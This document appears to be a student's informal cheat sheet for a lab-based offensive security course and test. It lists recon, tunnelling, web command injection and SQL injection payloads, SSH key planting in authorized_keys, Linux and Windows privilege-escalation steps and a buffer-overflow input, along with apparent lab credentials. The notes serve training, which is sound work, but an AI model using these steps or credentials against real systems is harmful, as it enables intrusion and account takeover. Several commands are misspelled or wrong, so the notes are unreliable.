# SecCCTC
NEW Security CCTC


OP station LINUX 10.50.21.175 

uploads 10.50.22.59/uploads for more info
______________________________
17
JORO-501-W
Bhe032390!!
10.50.23.20 < -jump box 

____________________________

http://10.50.20.103:8000/challenges  < -- - challenges 



Needed commands
_______________________________________________________
1- for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
2- proxychains nmap -Pn -sT 10.0.0.X -p 1-10000 -T5   or -iL --openm
3- proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse    < -- finds other webpages
== python server command ==	
	python -m SimpleHttpServer

xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboar
___________________________________________

make a SSH KEY 

On opstation
ssh-keygen -t rsa -b 4096
cat .ssh/id_rua.pub
ssh www-data@ip  ( or whatever the webuser is)
9- find the userers in the /etc/password then navigate down to find the file with ls -la 
10 - move the map to the host system 

try to insert an your own key after trying tom’ OR 1 = ‘1 in both fields:
		1 -In webpage box:    < mkdir /users/home/directory/.ssh>  or other path
		2 – echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys 
		3-  cat /users/home/directory/.ssh/authorized_keys 


  -______________________________________
  to get to second box student@ip -L 41711:192.168.28.120:4242
  then new tunnle of ssh student@127.0.0.1 -D 9050 




__________________________________________________________________
        Windows Priv esculation: Importatant to know
===First THING TO DO IS SHOW HIDDEN FILES!====
	File Explorer > File > Hidden files4624/4625
 	Always use ls -la

Next: Search: ==Task Scheduler===
	search bar > Task Scheduler  > new tasks are listed at top > Look in TS Library ..ignore one_drive stuff > Look at TRIGGERS Tab > Actions tab >  
 		 OR  schtasks /query /fo LIST /v  > powershell  >schtasks /query /fo LIST /v  | Select-String  -Pattern "Task To Run" | find /i /v "com handler"  > Start at the top look for putty.exe
    
Next: == Check Processes==
    	tasklist /v > note the PID (2222 or whatever) > query session > look at what your number session is > go back and view the tasklist /v | what you found > wmic process get name, processid, parentproessid, sessionid > scroll up to find the process you noted write down the parant process > wmic process ,where (processid=2222) list full > Do the same with the parent process you wrote > tasklist /svc | findsr /i "parent process you found" > find the location with <where /R c:\putty.exe>

Next == Services==
	look under services  > sort by discription > look for blank space > right click properties > look under all tabs > use for the ""for /f  "tokens"" command > use wimic command next > OR sc qc testservice2

 Next: == registry==   registry editor
 	HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
  	HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
   make sure to double click on stuff to see whole path

Next: == Audit Logging ==
auditpol /get /category:* | findstr /i "success failure"

LOOK AT EVENT ID'S 
	4624/4625 - Successful / failed login
 	4720 - Account Created
  	4672  - Administrative user logged on
   	7045 - Service created

Next: == Event Viewer ==
	

 XFREERDP Syntax: xfreerdp /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard
________________________________________________________________________
++++++ Linux Box ++++++  order: Extra, intra, internal 
https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.html#_discuss_dot_in_the_path

commands to run once you are in a box: 
whoami |ip -br a |ss -anult | cat /etc/hosts |cat /etc/crontab |less | tasklist /v |ps -elf | cd /var/tmp/ | uname -a 
Looking for logs check /etc

FIRST
++Priv esculation steps ++
sudo -l  > https://gtfobins > look up and past command > shell >

SECOND
== SUID ==
First run one of the following:

find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files

find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files

find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files

Compare to Lin-OPs, if its not there, look in GTFOBINS and run the command. 

see if there is a . in the path <may be admin executable>

== stolen key ==
chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4
__________________________________________________________
+++++++++++++++++++++++++++++++++++++___________________________________________________________________++++++++++++++++++++++++++++++++++++++++++++++++++++++++




FOR TEST
When given an IP
1 - <nmap -Pn -sT 10.0.0.X -p- -T5 >any ip that is given (Pivot box) 
2 – any port 80s or http ports run : proxychains nmap -Pn -sT 10.0.0.X -p 80 --script http-enum.nse  to find extra webpages
3- Try all /webstuff	
	    /more webstuff
		/lostawebstuff
  ____________________________________________________________________________________________________________________________
  ONCE ON A WEBPAGE
4- The  Box that has inputs : hit go button. Then past in the Possible_end.txt in one box / To_war in another grab info for flag,
5- On the same box, command inject one of them try: ; ls -la || ; /whoami  || ; pwd  || ; cat /etc/passwd || ; cat /etc/hosts
6- grab all users from the cated etc/passwd and save them someplace (www-var ect) 
7 – try to insert an your own PUB_key after trying tom’ OR 1 = ‘1 in both fields:
		1 -In webpage box:    < mkdir /users/home/directory/.ssh>
		2 – echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys 
		3-  cat /users/home/directory/.ssh/authorized_keys 
8- from your Lin_ops box you should be able to <ssh user@ip> without a password
***********Note: I would suggest making a new key: <ssh-keygen -t rsa> ************
__________________________________________________________________________________________________________________________

IF YOU FIND THE MAP WITH IP ADDRESS.. Make sure to EOM or scp the map to view
9- look at the map that you found for IP address.  Located at the bottom of the mad (Hint: there is also a flag)
__________________________________________________________________________________________________________________________

Tunnleing creationg and scanning for the new IPs
10 – Create a Dynamic tunnel so you can scan those IP’s (optional) IF not go to step 11. (ssh www-data@ip -D 9050)
11 – run <for i in {96..127}; do (ping -c 1 10.0.0.$i | grep "bytes from" &); done> in pivot box you got into for each IP address. (www-data box)
12 – run proxychains nmap -Pn -sT 10.0.0.X -p 1-10000 -T5 on each of the new IP’s you found. Notate any ports then run step 2 to see if there is any info for any webpages found 
13 – navigate to the new wepage and repeat step 3 
14 – Look at <page  sources> for any links as well
15 – if you come across a box that looks like it is a table: Try eploiting the URL Bar:
	A-	First try <coolwebsite.com.php? selection=1 Or 1=1> or 2 or 3 ect until tables ALL drop
	B-	Any columns displayed, put them in order <selection=<# your found> UNION SELECT 1,2,3 ect>
	C-	Use the GOLDEN STATEMENT < SELECT table_schema,table_name,column_name, 4 FROM information_schema.columns;>
 __________________________________________________________________________________________________________________________

 
PART 2
1 – In your Lin-OPS TRY EVERY COMBINATION AND PASSEORD that is given!! You should get 
A-	Linux box
B-	Windows box
_______________________________________________________________________________________


WINDOWS BOX:  FOLLOW THE WINDOWS STEPS ABOVE Line 51
1-	to access the Windows box first run a scan on the IP address that is given <step 11>
2-	run an NMAP on each new IP you found <step 1>
3-	find the box the you logged into as a windows user, look for the port that can run RDP (3889)
4-	RDP into that box 
____________________________________________________________________________________________________
a.	Set up your L tunnel <ssh www-data@jumpIP -L 1111:WinBoxIP:3389>
b.	xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboard
5-	Look around for files in USERS. Go to < C drive >> Users > Look for a sus folder
6-	For Persistence  check the regedit < search bar – regedit – follow the HKEY path  -- look at all the paths there and make sure to copy the ENTIRE path of the sus one. The file path is the last </name.here>
7-	For Called Program, follow the path:  <C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -windowstyle hidden -NoExit -file "C:\Program Files\scripts\kpersky_start.ps1">
8-	To get into admin home: You need to grab the file that they will give us and transfer it from your HOST to your WINDOWS: (Log into your account and download it)
	a.	On the windows box, open a webpage, navigate to the test website, download file. DONE use the account name and pass they give ya
____________________________________________________________________________________________________

Linux Explotaition
192.168.28.10 Kmichae pass MrMeeseeks 
1- sudo -l  < -- if this works goto GTFO webpage and search for the exploit! Copy past exploit then type <bash> for a esculated shell.
2 –<Bash> then ls -la 
3 you will see exploit.this
4- ./exploitthis AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
____________________________________________________________________________________________________

For inside root dir, 
1-	Log in as the user, 
2-	Sudo -l 
3-	Look for set UID and GUID
4-	Use the  find / -perm command <command here>
5-	A list of binaries will show
6-	On linops, run the same exact command and compare both of them Find the one that is not on one of the systems
7-	Then go to GTFO and look up that one and reserc the exploit
8-	 Make sure you do the intire path -p 
5 – Next follow buffer overflow steps.
For what program can give you higher priv, mak sure you find the buffer overflow  file in one of the questions

1-	To see what is inside the root dierectory
2-	2 find what Binary used 
POST exploitation
	1 – To view running process <ps -elf > look for one that ryscslogd
3-	Cat /ect/rcyslog.conf  for flag in comments
4-	To find the password use the find command find / iname “password” -file the cat the full path to file 
